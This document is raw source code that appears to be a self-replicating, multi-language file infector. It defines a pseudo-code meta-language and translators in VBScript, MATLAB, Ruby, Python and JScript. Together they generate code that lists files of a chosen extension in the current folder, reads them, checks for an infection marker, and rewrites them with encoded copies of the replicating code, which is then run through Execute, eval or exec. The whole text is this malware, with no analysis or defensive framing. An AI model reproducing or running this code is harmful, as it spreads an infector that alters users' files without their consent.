metaLanguage+=""__    AddStringAsChar newCodePython translatorVBS+=chr( translatorVBS )+chr( )"";
metaLanguage+=""__    AddStringAsChar newCodePython translatorMatLab+=chr( translatorMatLab )+chr( )"";
metaLanguage+=""__    AddStringAsChar newCodePython translatorRuby+=chr( translatorRuby )+chr( )"";
metaLanguage+=""__    AddStringAsChar newCodePython translatorPython+=chr( translatorPython )+chr( )"";
metaLanguage+=""__    Arithmetic newCodePython newCodePython + translatorPython"";         
metaLanguage+=""__    Arithmetic newCodePython newCodePython + allContent"";
metaLanguage+=""__    Write fileName newCodePython"";
metaLanguage+=""__  XX""
metaLanguage+=""__XX""

nl=String.fromCharCode(13,10)
translatorVBS='Function createBlockOfCode(CodeBlockArray)'+nl;
translatorVBS+='    Dim RString, i'+nl;
translatorVBS+='    RString=""""'+nl;
translatorVBS+='    For i=0 To UBound(CodeBlockArray)'+nl;
translatorVBS+='        LineCode=Split(CodeBlockArray(i),Chr(32))'+nl;
translatorVBS+='        If LineCode(0)=""Predefined"" Then'+nl;
translatorVBS+='            RString=RString+""set fso=CreateObject(""+Chr(34)+""Scripting.FileSystemObject""+Chr(34)+"")""+nl'+nl;            
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""Forall"" Then'+nl;
translatorVBS+='            RString=RString+""For Each x in fso.getfolder(""+Chr(34)+"".""+Chr(34)+"").files""+nl'+nl;
translatorVBS+='            RString=RString+""If lcase(fso.getextensionname(x))=""+Chr(34)+LineCode(1)+Chr(34)+"" Then""+nl'+nl;
translatorVBS+='            Dim j, NewBlock'+nl;
translatorVBS+='            NewBlock=Array()'+nl;
translatorVBS+='            j=i+1'+nl;
translatorVBS+='            Do While Left(CodeBlockArray(j),2)=""  ""'+nl;
translatorVBS+='                ReDim Preserve NewBlock(UBound(NewBlock) + 1)'+nl;
translatorVBS+='                NewBlock(UBound(NewBlock))=Mid(CodeBlockArray(j),3)'+nl;
translatorVBS+='                j=j+1'+nl;
translatorVBS+='            Loop'+nl;    
translatorVBS+='            RString=RString+createBlockOfCode(NewBlock)'+nl;             
translatorVBS+='            RString=RString+""End If""+nl'+nl;
translatorVBS+='            RString=RString+""Next""+nl'+nl;                 
translatorVBS+='        End If'+nl;   
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""If"" Then'+nl;
translatorVBS+='            RString=RString+""If ""+LineCode(1)+LineCode(2)+LineCode(3)+"" Then""+nl'+nl;
translatorVBS+='            Dim k, NewBlockIf'+nl;
translatorVBS+='            NewBlockIf=Array()'+nl;
translatorVBS+='            k=i+1'+nl;
translatorVBS+='            Do While Left(CodeBlockArray(k),2)=""  ""'+nl;
translatorVBS+='                ReDim Preserve NewBlockIf(UBound(NewBlockIf) + 1)'+nl;
translatorVBS+='                NewBlockIf(UBound(NewBlockIf))=Mid(CodeBlockArray(k),3)'+nl;
translatorVBS+='                k=k+1'+nl;  
translatorVBS+='            Loop'+nl;    
translatorVBS+='            RString=RString+createBlockOfCode(NewBlockIf)'+nl;
translatorVBS+='            RString=RString+""End If""+nl'+nl;
translatorVBS+='        End If'+nl;     
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""GetFileName"" Then'+nl;
translatorVBS+='            RString=RString+LineCode(1)+""=x""+nl'+nl;
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""ReadAll"" Then'+nl;
translatorVBS+='             RString=RString+LineCode(1)+""=fso.opentextfile(""+LineCode(2)+"").readall""+nl'+nl;
translatorVBS+='        End If'+nl;        
translatorVBS+=''+nl;
translatorVBS+='        If LineCode(0)=""Exist"" Then'+nl;
translatorVBS+='             RString=RString+LineCode(1)+""=InStr(""+LineCode(2)+"",""+LineCode(3)+"")-1""+nl'+nl;
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;
translatorVBS+='        If LineCode(0)=""Def"" Then'+nl; 
translatorVBS+='             RString=RString+""Dim ""+LineCode(1)+nl'+nl;
translatorVBS+='             RString=RString+LineCode(1)+""=""+Chr(34)+Chr(34)+nl'+nl;
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""Arithmetic"" Then'+nl;
translatorVBS+='             RString=RString+LineCode(1)+""=""+LineCode(2)+LineCode(3)+LineCode(4)+nl'+nl;
translatorVBS+='        End If'+nl;        
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""Write"" Then'+nl;
translatorVBS+='             RString=RString+""fso.opentextfile(""+LineCode(1)+"",2).write ""+LineCode(2)+nl'+nl;      
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""AddString"" Then'+nl;
translatorVBS+='            RString=RString+LineCode(1)+""=""+LineCode(1)+""+""+Chr(34)+LineCode(2)+Chr(34)+nl'+nl;
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""AddChar"" Then'+nl; 
translatorVBS+='            RString=RString+LineCode(1)+""=""+LineCode(1)'+nl; 
translatorVBS+='            Dim n'+nl; 
translatorVBS+='            For n=2 To UBound(LineCode)'+nl; 
translatorVBS+='                RString=RString+""+Chr(""+LineCode(n)+"")""'+nl;     
translatorVBS+='            Next'+nl;  
translatorVBS+='            RString=RString+nl'+nl;           
translatorVBS+='        End If'+nl;        
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""AddML"" Then'+nl;
translatorVBS+='            RString=RString+""metaLanguage=""'+nl;
translatorVBS+='            Dim l'+nl;
translatorVBS+='            For l=1 To Len(metaLanguage)'+nl;
translatorVBS+='                RString=RString+""Chr(""'+nl;
translatorVBS+='                RString=RString+CStr(Asc(Mid(metaLanguage,l,1)))'+nl;
translatorVBS+='                RString=RString+"")+""'+nl;
translatorVBS+='            Next'+nl;
translatorVBS+='            RString=Left(RString,Len(RString)-1)+nl'+nl;           
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)=""AddStringAsChar"" Then'+nl;
translatorVBS+='            Dim StringTrafo, m, TmpVar, qq'+nl;
translatorVBS+='            StringTrafo=Eval(LineCode(3))'+nl;
translatorVBS+='            qq=1'+nl;
translatorVBS+='            While qq<Len(StringTrafo)'+nl;
translatorVBS+='                count=1000'+nl;
translatorVBS+='                TmpVar=""""'+nl;
translatorVBS+='                If Len(StringTrafo)-qq<1000 Then'+nl;
translatorVBS+='                    count=Len(StringTrafo)-qq'+nl;
translatorVBS+='                End If'+nl;
translatorVBS+='                For m=0 To count'+nl;
translatorVBS+='                    TmpVar=TmpVar+CStr(Asc(Mid(StringTrafo,qq,1)))+LineCode(4)'+nl;
translatorVBS+='                    qq=qq+1'+nl;
translatorVBS+='                Next'+nl;
translatorVBS+='                RString=RString+LineCode(1)+""=""+LineCode(1)+""+""+Chr(34)+LineCode(2)+Left(TmpVar,Len(TmpVar)-Len(LineCode(4)))+LineCode(5)+Chr(34)+nl'+nl;
translatorVBS+='                RString=RString+LineCode(1)+""=""+LineCode(1)+""+Chr(13)+Chr(10)""+nl'+nl;
translatorVBS+='            Wend'+nl;
translatorVBS+='        End If'+nl; 
translatorVBS+='    Next'+nl;
translatorVBS+='    createBlockOfCode=RString'+nl;    
translatorVBS+='End Function'+nl;
translatorVBS+=''+nl;
translatorVBS+='nl=Chr(13)+Chr(10)'+nl;
translatorVBS+='xx=Split(metaLanguage,""__"")'+nl;
translatorVBS+='MyCode=createBlockOfCode(xx)'+nl;
translatorVBS+='Execute(MyCode)'+nl;

translatorMatLab=""function RString = createBlockOfCode(CodeBlockArray,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython)""+nl;
translatorMatLab+=""nl=char([13 10]);""+nl;    
translatorMatLab+=""RString='';""+nl;
translatorMatLab+=""    for i=1:length(CodeBlockArray)""+nl;        
translatorMatLab+=""        LineCode=[];""+nl;
translatorMatLab+=""        tmpCBA=CodeBlockArray{i};""+nl;
translatorMatLab+=""        SplitOffset=[1 strfind(tmpCBA,' ') length(tmpCBA)+1];""+nl;
translatorMatLab+=""        for j=1:length(SplitOffset)-1""+nl;
translatorMatLab+=""            LineCode{end+1}=tmpCBA(SplitOffset(j):SplitOffset(j+1)-1);""+nl;
translatorMatLab+=""        end""+nl;
translatorMatLab+=""        if(strcmp(LineCode(1),'Forall'))""+nl;
translatorMatLab+=""            RString=[RString 'e=dir(' char(39) '*.' LineCode{2}(2:end) char(39) ');' nl];""+nl;
translatorMatLab+=""            RString=[RString 'for d=1:length(e) ' nl];""+nl;
translatorMatLab+=""            j=i+1;NewBlock={};""+nl;
translatorMatLab+=""            while strcmp(CodeBlockArray{j}(1:2),'  ')""+nl;
translatorMatLab+=""                NewBlock{end+1}=CodeBlockArray{j}(3:end);""+nl;
translatorMatLab+=""                j=j+1;""+nl;
translatorMatLab+=""            end""+nl;
translatorMatLab+=""            RString=[RString createBlockOfCode(NewBlock,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython)];""+nl;
translatorMatLab+=""            RString=[RString 'end;' nl];""+nl;
translatorMatLab+=""        end""+nl;    
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if(strcmp(LineCode(1),'If'))""+nl;
translatorMatLab+=""            RString=[RString 'if ' LineCode{2}(2:end) LineCode{3}(2:end) LineCode{4}(2:end) nl];""+nl;
translatorMatLab+=""            j=i+1;NewBlock={};""+nl;
translatorMatLab+=""            while strcmp(CodeBlockArray{j}(1:2),'  ')""+nl;
translatorMatLab+=""                NewBlock{end+1}=CodeBlockArray{j}(3:end);""+nl;
translatorMatLab+=""                j=j+1;""+nl;
translatorMatLab+=""            end""+nl;
translatorMatLab+=""            RString=[RString createBlockOfCode(NewBlock,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython)];""+nl;
translatorMatLab+=""            RString=[RString 'end;' nl];""+nl;            
translatorMatLab+=""        end""+nl;           
translatorMatLab+=""""+nl;
translatorMatLab+=""        if(strcmp(LineCode(1),'GetFileName'))""+nl;     
translatorMatLab+=""            RString=[RString LineCode{2}(2:end) '=e(d).name;' nl];""+nl;
translatorMatLab+=""        end""+nl;
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if(strcmp(LineCode(1),'ReadAll'))""+nl;     
translatorMatLab+=""            RString=[RString 'tmpML=fopen(' LineCode{3}(2:end) ',' char(39) 'r+' char(39) ');' nl];""+nl;
translatorMatLab+=""            RString=[RString LineCode{2}(2:end) '=fread(tmpML,' char(39) '*char' char(39) ')' char(39) ';' nl];""+nl;
translatorMatLab+=""            RString=[RString 'fclose(tmpML);' nl];""+nl;
translatorMatLab+=""        end""+nl;        
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if(strcmp(LineCode(1),'Exist'))""+nl;     
translatorMatLab+=""            RString=[RString LineCode{2}(2:end) '=length(findstr(' LineCode{3}(2:end) ',' LineCode{4}(2:end) '))-1;' nl];""+nl;
translatorMatLab+=""        end""+nl;   
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if(strcmp(LineCode(1),'Def'))""+nl;     
translatorMatLab+=""            RString=[RString LineCode{2}(2:end) '=[];' nl];""+nl;
translatorMatLab+=""        end""+nl;   
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if(strcmp(LineCode(1),'Arithmetic'))""+nl;     
translatorMatLab+=""            RString=[RString LineCode{2}(2:end) '=[' LineCode{3}(2:end) ' ' LineCode{5}(2:end) '];' nl];""+nl;
translatorMatLab+=""        end""+nl;   
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if(strcmp(LineCode(1),'Write'))""+nl;     
translatorMatLab+=""            RString=[RString 'tmpML=fopen(' LineCode{2}(2:end) ',' char(39) 'r+' char(39) ');' nl];""+nl;
translatorMatLab+=""            RString=[RString 'fwrite(tmpML,' LineCode{3}(2:end) ');' nl];""+nl;
translatorMatLab+=""            RString=[RString 'fclose(tmpML);' nl];""+nl;
translatorMatLab+=""        end""+nl;   
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if(strcmp(LineCode(1),'AddString'))""+nl; 
translatorMatLab+=""            RString=[RString LineCode{2}(2:end) '=[' LineCode{2}(2:end) ' ' char(39) LineCode{3}(2:end) char(39) '];' nl];""+nl;
translatorMatLab+=""        end""+nl;          
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if(strcmp(LineCode(1),'AddChar'))""+nl;     
translatorMatLab+=""            RString=[RString LineCode{2}(2:end) '=[' LineCode{2}(2:end) ' '];""+nl;
translatorMatLab+=""            for j=3:length(LineCode)""+nl;
translatorMatLab+=""                RString=[RString 'char(' LineCode{j}(2:end) ') '];""+nl;
translatorMatLab+=""            end""+nl;
translatorMatLab+=""            RString=[RString '];' nl];""+nl;
translatorMatLab+=""        end""+nl;           
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if strcmp(LineCode(1),'AddML')""+nl;
translatorMatLab+=""            RString=[RString 'metaLanguage=char([' int2str(metaLanguage-0) ']);' nl];""+nl;
translatorMatLab+=""        end""+nl;
translatorMatLab+=""""+nl;        
translatorMatLab+=""        if strcmp(LineCode(1),'AddStringAsChar')""+nl;
translatorMatLab+=""            StringTrafo=eval(LineCode{4}(2:end));""+nl;
translatorMatLab+=""            j=1;""+nl;
translatorMatLab+=""            while j<length(StringTrafo)""+nl;
translatorMatLab+=""                count=1000;""+nl;
translatorMatLab+=""                TmpVar='';""+nl;
translatorMatLab+=""                if length(StringTrafo)-j<1000""+nl;
translatorMatLab+=""                    count=length(StringTrafo)-j+1;""+nl;
translatorMatLab+=""                end;""+nl;
translatorMatLab+=""                for k=1:count""+nl;
translatorMatLab+=""                    TmpVar=[TmpVar int2str(StringTrafo(j)-0) LineCode{5}(2:end)];""+nl;
translatorMatLab+=""                    j=j+1;""+nl;
translatorMatLab+=""                end""+nl;                        
translatorMatLab+=""                RString=[RString LineCode{2}(2:end) '=[' LineCode{2}(2:end) ' ' char(39) LineCode{3}(2:end) TmpVar(1:end-length(LineCode{5})+1) LineCode{6}(2:end) char(39) '];' nl];""+nl;
translatorMatLab+=""                RString=[RString LineCode{2}(2:end) '=[' LineCode{2}(2:end) ' char([13,10])];' nl];""+nl;
translatorMatLab+=""            end""+nl;
translatorMatLab+=""        end""+nl;
translatorMatLab+=""    end""+nl;
translatorMatLab+=""end""+nl;

translatorRuby='def createBlockOfCode(codeBlockArray,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython)'+nl;
translatorRuby+='    rString=""""'+nl;
translatorRuby+='    i=0'+nl;
translatorRuby+='    while i<codeBlockArray.length'+nl;
translatorRuby+='        lineCode=codeBlockArray[i].split(/ /)'+nl;
translatorRuby+='        if lineCode[0].eql? ""Forall""'+nl;
translatorRuby+='            rString << ""c=Dir.open(Dir.getwd);c.each do |d|"" << 13.chr << 10.chr << ""if File.exist?(d) && File.extname(d)=="" << 34.chr << ""."" << lineCode[1] << 34.chr << "";""'+nl;
translatorRuby+='            j=i+1;newBlock=[]'+nl;
translatorRuby+='            while codeBlockArray[j][0,2].eql? ""  ""'+nl;
translatorRuby+='                newBlock.push(codeBlockArray[j][2,codeBlockArray[j].length]);'+nl;
translatorRuby+='                j+=1;'+nl;
translatorRuby+='            end'+nl;
translatorRuby+='            rString << createBlockOfCode(newBlock,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython) << ""end;end"" << 13.chr << 10.chr'+nl;
translatorRuby+='        end'+nl;
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""If""'+nl;
translatorRuby+='            rString << ""if "" << lineCode[1] << lineCode[2] << lineCode[3] << 13.chr << 10.chr'+nl;
translatorRuby+='            j=i+1;newBlock=[]'+nl;
translatorRuby+='            while codeBlockArray[j][0,2].eql? ""  ""'+nl;
translatorRuby+='                newBlock.push(codeBlockArray[j][2,codeBlockArray[j].length])'+nl;
translatorRuby+='                j+=1'+nl;
translatorRuby+='            end;'+nl;
translatorRuby+='            rString << createBlockOfCode(newBlock,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython) << ""end"" << 13.chr << 10.chr'+nl;  
translatorRuby+='        end'+nl;
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""GetFileName""'+nl;      
translatorRuby+='            rString << lineCode[1] << ""=d;""'+nl;
translatorRuby+='        end'+nl;  
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""ReadAll""'+nl;      
translatorRuby+='            rString << ""f=File.open("" << lineCode[2] << "","" << 34.chr << ""r+"" << 34.chr << "");"" << lineCode[1] << ""=f.read(File.size(f));f.close;""'+nl;
translatorRuby+='        end'+nl;          
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""Exist""'+nl;      
translatorRuby+='            rString << ""tmp="" << lineCode[2] << "".include?("" << lineCode[3] << "");"" << lineCode[1] << ""=0;if !tmp;"" << lineCode[1] <<""=-1;end;""'+nl;
translatorRuby+='        end'+nl;   
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""Def""'+nl;      
translatorRuby+='            rString<<lineCode[1]<<""=""<<34.chr<<34.chr<<"";"";'+nl;
translatorRuby+='        end'+nl;   
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""Arithmetic""'+nl;      
translatorRuby+='            rString<<lineCode[1]<<""=""<<lineCode[2]<<""<<""<<lineCode[4]<<"";"";'+nl;
translatorRuby+='        end'+nl;
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""Write""'+nl;      
translatorRuby+='            rString<<""a=File.open(""<<lineCode[1]<<"",""<<34.chr<<""w""<<34.chr<<"");a.write(""<<lineCode[2]<<"");a.close;""'+nl;
translatorRuby+='        end'+nl;        
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""AddString""'+nl;      
translatorRuby+='            rString<<lineCode[1]<<""<<""<<34.chr<<lineCode[2]<<34.chr<<"";""'+nl;
translatorRuby+='        end'+nl;     
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""AddChar""'+nl;      
translatorRuby+='            rString<<lineCode[1];'+nl;
translatorRuby+='            j=2;'+nl;
translatorRuby+='            while j<lineCode.length'+nl;
translatorRuby+='                rString <<""<<""<<lineCode[j]<<"".chr"";'+nl;
translatorRuby+='                j+=1;'+nl;                
translatorRuby+='            end'+nl;
translatorRuby+='            rString<<"";""'+nl;
translatorRuby+='        end'+nl;                      
translatorRuby+=''+nl;
translatorRuby+='        if lineCode[0].eql? ""AddML""'+nl;
translatorRuby+='            j=0;'+nl;
translatorRuby+='            while j<metaLanguage.length'+nl;
translatorRuby+='                rString<<""metaLanguage"";'+nl;
translatorRuby+='                count=1000;'+nl;
translatorRuby+='                tmpVar="""";'+nl;
translatorRuby+='                if metaLanguage.length-j<1000'+nl;
translatorRuby+='                    count=metaLanguage.length-j;'+nl;
translatorRuby+='                end;'+nl;
translatorRuby+='                k=0;'+nl;
translatorRuby+='                while k<count'+nl;
translatorRuby+='                    tmpVar<<metaLanguage[j].ord.to_s()<<"".chr<<""'+nl;
translatorRuby+='                    j+=1;k+=1;'+nl;
translatorRuby+='                end;'+nl;             
translatorRuby+='                rString <<""<<""<<tmpVar[0..tmpVar.length-3]<<"";""<<13.chr<<10.chr;'+nl;
translatorRuby+='                j+=1;'+nl;
translatorRuby+='            end'+nl;
translatorRuby+='            rString<<"";""'+nl;
translatorRuby+='        end'+nl;
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? ""AddStringAsChar""'+nl;      
translatorRuby+='            stringTrafo=eval(lineCode[3]);'+nl;
translatorRuby+='            j=0;'+nl;
translatorRuby+='            while j<stringTrafo.length'+nl;
translatorRuby+='                count=1000;'+nl;
translatorRuby+='                tmpVar="""";'+nl;
translatorRuby+='                if stringTrafo.length-j<1000'+nl;
translatorRuby+='                    count=stringTrafo.length-j;'+nl;
translatorRuby+='                end;'+nl;
translatorRuby+='                k=0;'+nl;
translatorRuby+='                while k<count'+nl;
translatorRuby+='                    tmpVar<<stringTrafo[j].ord.to_s()<<lineCode[4]'+nl;
translatorRuby+='                    j+=1;k+=1;'+nl;
translatorRuby+='                end;'+nl;
translatorRuby+='                rString<<lineCode[1]<<""<<""<<34.chr<<lineCode[2]<<tmpVar[0..tmpVar.length-1-lineCode[4].length]<<lineCode[5]<<34.chr<<"";""'+nl;
translatorRuby+='                rString<<lineCode[1]<<""<<13.chr<<10.chr;"";'+nl;
translatorRuby+='            end'+nl;
translatorRuby+='        end'+nl;  
translatorRuby+='        i+=1'+nl;
translatorRuby+='    end'+nl;
translatorRuby+='    return(rString)'+nl;
translatorRuby+='end'+nl;
translatorRuby+='xx=metaLanguage.split(""__"");'+nl;
translatorRuby+='myCode=createBlockOfCode(xx,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython);'+nl;
translatorRuby+='eval(myCode)'+nl;

translatorPython='import os'+nl;
translatorPython+='def createBlockOfCode(CodeBlockArray,space):'+nl;
translatorPython+='    nl=chr(13)+chr(10)'+nl;
translatorPython+='    RString=""""'+nl;
translatorPython+='    for i in range(len(CodeBlockArray)):'+nl;
translatorPython+='        LineCode=CodeBlockArray[i].split("" "")'+nl;
translatorPython+='        if LineCode[0]==""Forall"":'+nl;
translatorPython+='            RString+=space+""a=os.listdir(os.curdir)""+nl'+nl;
translatorPython+='            RString+=space+""for i in range(len(a)):""+nl'+nl;
translatorPython+='            RString+=space+""  if a[i].find(""+chr(34)+"".""+LineCode[1]+chr(34)+"")>0:""+nl'+nl;            
translatorPython+='            j=i+1'+nl;
translatorPython+='            NewBlock=[]'+nl;
translatorPython+='            while CodeBlockArray[j][0:2]==""  "":'+nl;
translatorPython+='                NewBlock.append(CodeBlockArray[j][2:len(CodeBlockArray[j])])'+nl;
translatorPython+='                j+=1'+nl;
translatorPython+=''+nl;
translatorPython+='            RString+=createBlockOfCode(NewBlock,space+""    "")+nl'+nl;
translatorPython+=''+nl;
translatorPython+='        if LineCode[0]==""If"":'+nl;
translatorPython+='            RString+=space+""if ""+LineCode[1]+LineCode[2]+LineCode[3]+"":""+nl'+nl;     
translatorPython+='            j=i+1'+nl;
translatorPython+='            NewBlock=[]'+nl;
translatorPython+='            while CodeBlockArray[j][0:2]==""  "":'+nl;
translatorPython+='                NewBlock.append(CodeBlockArray[j][2:len(CodeBlockArray[j])])'+nl;
translatorPython+='                j+=1'+nl;
translatorPython+='            RString+=createBlockOfCode(NewBlock,space+""    "")+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""GetFileName"":'+nl;
translatorPython+='            RString+=space+LineCode[1]+""=a[i]""+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""ReadAll"":'+nl;
translatorPython+='            RString+=space+""h=open(""+LineCode[2]+"",""+chr(34)+""r""+chr(34)+"")""+nl'+nl;
translatorPython+='            RString+=space+LineCode[1]+""=h.read()""+nl'+nl;
translatorPython+='            RString+=space+""h.close()""+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""Exist"":'+nl;
translatorPython+='            RString+=space+LineCode[1]+""=""+LineCode[2]+"".find(""+LineCode[3]+"")""+nl'+nl;
translatorPython+=''+nl;
translatorPython+='        if LineCode[0]==""Def"":'+nl;
translatorPython+='            RString+=space+LineCode[1]+""=""+chr(34)+chr(34)+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""Arithmetic"":'+nl;
translatorPython+='            RString+=space+LineCode[1]+""=""+LineCode[2]+LineCode[3]+LineCode[4]+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""Write"":'+nl;
translatorPython+='            RString+=space+""h=open(""+LineCode[1]+"",""+chr(34)+""w""+chr(34)+"")""+nl'+nl;
translatorPython+='            RString+=space+""h.write(""+LineCode[2]+"")""+nl'+nl;
translatorPython+='            RString+=space+""h.close()""+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""AddString"":'+nl;
translatorPython+='            RString+=space+LineCode[1]+""+=""+chr(34)+LineCode[2]+chr(34)+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""AddChar"":'+nl;
translatorPython+='            RString+=space+LineCode[1]+""=""+LineCode[1]'+nl;
translatorPython+='            j=2'+nl;
translatorPython+='            while j<len(LineCode):'+nl;
translatorPython+='                RString+=""+chr(""+LineCode[j]+"")""'+nl;
translatorPython+='                j+=1'+nl;
translatorPython+='            RString+=nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""AddML"":'+nl;
translatorPython+='            RString+=space+""metaLanguage=""+chr(34)+chr(34)+nl'+nl;
translatorPython+='            j=0'+nl;
translatorPython+='            while j<len(metaLanguage):'+nl;
translatorPython+='                count=min(1000,len(metaLanguage)-j)'+nl;
translatorPython+='                TmpVar=""""'+nl;
translatorPython+='                for k in range(count):'+nl;
translatorPython+='                    TmpVar+=str(ord(metaLanguage[j]))+"")+chr(""'+nl;
translatorPython+='                    j+=1'+nl;
translatorPython+='                RString+=space+""metaLanguage+=chr(""+TmpVar[0:len(TmpVar)-6]+"")""+nl'+nl
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]==""AddStringAsChar"":'+nl;
translatorPython+='            StringTrafo=eval(LineCode[3])'+nl;
translatorPython+='            j=0'+nl;
translatorPython+='            while j<len(StringTrafo):'+nl;
translatorPython+='                count=min(1000,len(StringTrafo)-j)'+nl;
translatorPython+='                TmpVar=""""'+nl;
translatorPython+='                for k in range(count):'+nl;
translatorPython+='                    TmpVar+=str(ord(StringTrafo[j]))+LineCode[4]'+nl;
translatorPython+='                    j+=1'+nl;
translatorPython+='                RString+=space+LineCode[1]+""+=""+chr(34)+LineCode[2]+TmpVar[0:len(TmpVar)-len(LineCode[4])]+LineCode[5]+chr(34)+""+chr(13)+chr(10)""+nl'+nl;
translatorPython+=''+nl;               
translatorPython+='    return(RString)'+nl;
translatorPython+=''+nl;        
translatorPython+='xx=metaLanguage.split(""__"")'+nl;
translatorPython+='MyCode=createBlockOfCode(xx,"""")'+nl;
//translatorPython+='h=open(""mycode.py"",""w"");h.write(MyCode);h.close();'+nl;
translatorPython+='exec(MyCode)'+nl;



function createBlockOfCode(CodeBlockArray)
{
    var RString=''; 
    for(var i=0;i<CodeBlockArray.length;i++)
    {
        var LineCode=CodeBlockArray[i].split(String.fromCharCode(32));
        if(LineCode[0]=='Predefined')
        {
            RString+='fso=new ActiveXObject('+String.fromCharCode(34)+'scripting.filesystemobject'+String.fromCharCode(34)+');'+nl
        }
        
        if(LineCode[0]=='Forall')
        {
            var ext=LineCode[1];
            RString+='for(d=new Enumerator(fso.getfolder('+String.fromCharCode(34)+'.'+String.fromCharCode(34)+').files);!d.atEnd();d.moveNext()){'+nl;
            RString+='if(fso.getextensionname(d.item()).toLowerCase()=='+String.fromCharCode(34)+ext+String.fromCharCode(34)+'){'+nl;         
            var j=i+1;var NewBlock=[];
            while(CodeBlockArray[j].substring(0,2)=='  ')
            {
                NewBlock.push(CodeBlockArray[j].substring(2));j++;
            }
            RString+=createBlockOfCode(NewBlock);
            RString+='}}'+nl;
        }
        
        if(LineCode[0]=='If')
        {
            RString+='if('+LineCode[1]+LineCode[2]+LineCode[3]+'){'+nl;        
            var j=i+1;var NewBlock=[];
            while(CodeBlockArray[j].substring(0,2)=='  ')
            {
                NewBlock.push(CodeBlockArray[j].substring(2));j++;
            }          
            RString+=createBlockOfCode(NewBlock);
            RString+='}'+nl;
        }         
        
        if(LineCode[0]=='GetFileName')
        {
            RString+=LineCode[1]+'=d.item();'+nl;
        }
        
        if(LineCode[0]=='ReadAll')
        {
            RString+=LineCode[1]+'=fso.opentextfile('+LineCode[2]+').readall();'+nl;
        }
        
        if(LineCode[0]=='Exist')
        {
            RString+=LineCode[1]+'='+LineCode[2]+'.search('+LineCode[3]+');'+nl;
        }
        
        if(LineCode[0]=='Def')
        {
            RString+=LineCode[1]+'='+String.fromCharCode(34,34)+';'+nl;
        }     
        
        if(LineCode[0]=='Arithmetic')
        {
            RString+=LineCode[1]+'='+LineCode[2]+LineCode[3]+LineCode[4]+nl;
        }    
        
        if(LineCode[0]=='Write')
        {
            RString+='fso.opentextfile('+LineCode[1]+',2).write('+LineCode[2]+');'+nl;
        }  
        
        if(LineCode[0]=='AddString')
        {
            RString+=LineCode[1]+'+='+String.fromCharCode(34)+LineCode[2]+String.fromCharCode(34)+';'+nl;
        }  
        
        if(LineCode[0]=='AddChar')
        {
            RString+=LineCode[1]+'='+LineCode[1];
            for(var j=2; j<LineCode.length; j++)
            {
                RString+='+String.fromCharCode('+LineCode[j]+')'
            }
            RString+=';'
        }
        
        if(LineCode[0]=='AddML')
        {
            RString+='metaLanguage=String.fromCharCode(';
            for(j=0;j<metaLanguage.length;j++)
            {
                RString+=metaLanguage.charCodeAt(j)+',';                
            }
            RString+='13,10);'+nl;
        }
                       
        if(LineCode[0]=='AddStringAsChar')
        {
            var StringTrafo=eval(LineCode[3]);
            j=0;
            while (j<StringTrafo.length)
            {
                count=1000;
                var TmpVar='';
                if(StringTrafo.length-j<1000){count=StringTrafo.length-j;}
                for(k=0;k<count;k++)
                {
                    TmpVar+=StringTrafo.charCodeAt(j)+LineCode[4];
                    j++;
                }  
                RString+=LineCode[1]+'+=""'+LineCode[2]+TmpVar.substr(0,TmpVar.length-LineCode[4].length)+LineCode[5]+'""'+nl;            
                RString+=LineCode[1]+'+=String.fromCharCode(13,10);';
            }
        }
    }
    return(RString)
}

translatorJS=createBlockOfCode;
translatorJS+='nl=String.fromCharCode(13,10);';
